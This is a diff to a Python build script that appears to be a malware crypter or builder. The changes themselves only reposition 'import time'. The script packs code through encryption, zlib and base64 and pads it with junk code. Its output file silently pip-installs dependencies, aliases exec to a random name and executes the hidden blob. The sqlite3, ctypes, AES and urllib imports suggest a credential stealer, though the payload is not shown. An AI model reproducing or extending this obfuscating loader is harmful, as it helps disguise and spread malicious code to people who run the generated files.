@@ -8,7 +8,7 @@ import string
 from cryptography.fernet import Fernet
 import logging
 import sys
-
+import time
 # Constants and configurations
 BUILD_PATH = "./build"
 TEMP_FILE_PATH = "./Build/temp.py"
@@ -128,6 +128,7 @@ def main():
     key_list.insert(keyssss, key)
 
     obfuscated_code = f'''
+import time
 {all_fake_code}
 import zlib
 import base64
@@ -140,7 +141,6 @@ except ImportError:
     from cryptography.fernet import Fernet
 
 import subprocess
-import time
 requirements = [
     ["requests", "requests"],
     ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
@@ -183,7 +183,7 @@ decompressed_code = zlib.decompress(decrypted_code).decode('utf-8')
     s = base64.b64encode(obfuscated_code.encode('utf-8'))
     aw = random_class_name()
     with open(f'{BUILD_PATH}/{name}', "wb") as obfu_file:
-        obfu_file.write(f"{all_fake_code}\nimport ctypes;import base64,subprocess,sqlite3,json,shutil,time\nfrom json import loads, dumps\nfrom urllib.request import Request, urlopen\ntry:import cryptography\nexcept:subprocess.run('python -m pip install cryptography')\ntry:from cryptography.fernet import Fernet\nexcept:subprocess.run('python -m pip install cryptography', shell=True)\ntry:import requests\nexcept:subprocess.run('python -m pip install requests', shell=True)\ntry:from Crypto.Cipher import AES\nexcept:subprocess.run('python -m pip install Crypto', shell=True)\n{all_fake_code}\n{e} = exec\n{all_fake_code}\nimport concurrent.futures\n{aw}='{s.decode('utf-8')}'\n{e}(base64.b64decode({aw}))\n{all_fake_code}".encode("utf-8"))   
+        obfu_file.write(f"{all_fake_code}\nimport ctypes;import base64,subprocess,sqlite3,json,shutil\nimport time\nfrom json import loads, dumps\nfrom urllib.request import Request, urlopen\ntry:import cryptography\nexcept:subprocess.run('python -m pip install cryptography')\ntry:from cryptography.fernet import Fernet\nexcept:subprocess.run('python -m pip install cryptography', shell=True)\ntry:import requests\nexcept:subprocess.run('python -m pip install requests', shell=True)\ntry:from Crypto.Cipher import AES\nexcept:subprocess.run('python -m pip install Crypto', shell=True)\n{all_fake_code}\n{e} = exec\n{all_fake_code}\nimport concurrent.futures\n{aw}='{s.decode('utf-8')}'\n{e}(base64.b64decode({aw}))\n{all_fake_code}".encode("utf-8"))   
     obfuscated_file_path = os.path.join(BUILD_PATH, f"{name}")
 
     # Clean up
